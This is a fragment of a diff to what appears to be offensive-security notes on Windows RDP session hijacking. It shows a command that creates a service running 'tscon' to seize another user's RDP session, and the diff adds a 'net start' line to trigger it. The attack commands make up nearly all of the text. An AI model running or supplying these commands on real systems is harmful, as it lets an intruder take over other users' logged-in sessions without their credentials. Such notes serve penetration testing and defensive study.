@@ -14,9 +14,9 @@ query user
 ```
 sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
 ```
-...rdp-tcp#13 is our current session
+`rdp-tcp#13` is our current session
 
-
-
-
+```
+net start sessionhijack
+```
 
